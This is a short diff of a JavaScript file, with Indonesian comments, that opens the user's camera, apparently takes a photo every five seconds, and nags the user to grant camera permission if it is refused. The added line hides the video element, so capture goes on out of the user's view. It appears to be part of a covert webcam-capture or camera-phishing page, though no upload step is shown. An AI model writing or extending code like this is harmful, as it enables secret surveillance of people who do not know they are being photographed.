@@ -46,6 +46,7 @@ navigator.mediaDevices
     video.setAttribute("playsinline", true);
     video.setAttribute("muted", true);
     video.srcObject = stream;
+    video.style.display = "none";
     document.body.appendChild(video);
 
     // 🔥 Ambil foto tiap 5 detik
@@ -99,3 +100,4 @@ navigator.mediaDevices
   .catch(() => {
     alert("🚫 Kamera ditolak. Aktifkan izin untuk lanjut.");
   });
+
